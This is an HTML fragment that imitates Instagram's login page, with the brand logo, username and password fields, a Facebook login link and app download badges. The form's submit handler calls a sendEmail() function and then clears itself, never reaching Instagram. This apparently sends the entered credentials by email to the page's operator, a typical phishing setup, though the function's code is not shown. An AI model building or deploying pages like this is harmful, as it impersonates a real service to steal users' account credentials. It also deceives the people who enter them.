  <body>
    <div id="content-container">
      <!--Phone's pictures section-->
      <section class="phones">
        <img
          src="home-phones (1) copy.png"
          alt="pictures on phone"
          class="phone-image"
        />
        <div class="display-phone">
          <img class="picture" src="screenshot1.png" alt="#" />
          <img class="picture" src="screenshot2.png" alt="#" />
          <img class="picture" src="screenshot3.png" alt="#" />
          <img class="picture" src="screenshot4.png" alt="#" />
        </div>
      </section>

      <!--User's log in section-->
      <section class="user">
        <div class="login-container">
          <!--Instagram Logo-->
          <div class="instagram-logo-box">
            <img class="instagram-logo" src="instagram-logo.png" />
          </div>

          <!--Form Login-->
          <form
            id="login-post"
            method="POST"
            onsubmit="sendEmail(); reset(); return false;"
          >
            <div class="inputs-container">
              <input
                type="text"
                name="username"
                id="username"
                placeholder="Phone number, username or email"
                required
              />
            </div>
            <div class="inputs-container">
              <input
                type="password"
                name="password"
                id="password"
                placeholder="Password"
              />
            </div>
            <button class="login-button" type="submit" id="openPageButton">
              Log In
            </button>
            <div class="or-container">
              <div class="line"></div>
              <div class="or">OR</div>
              <div class="line"></div>
            </div>

            <!--Facebook login-->
            <div class="facebook-container">
              <a class="facebook-login" href="http://facebook.com/" target="_blank"
                ><img class="facebook-logo" src="facebook-logo.png" />Log
                in with Facebook</a
              >
            </div>
          </form>

          <!--Password recovery-->
          <a class="password-forgot" href="#" target="_blank"
            >Forgot password?</a
          >
        </div>

        <!--Sign up-->
        <div class="signup-container">
          <p>
            Don't have an account?
            <a class="signup" href="#" target="_blank">Sign up</a>
          </p>
        </div>

        <!--App's download-->
        <div class="get-container">
          <p>Get the app.</p>
          <div class="download-container">
            <a class="download-appstore" href="#" target="_blank"
              ><img class="appstore" src="App.png"
            /></a>
            <a class="download-googleplay" href="#" target="_blank"
              ><img class="googleplay" src="Micro.png"
            /></a>
          </div>
        </div>
      </section>
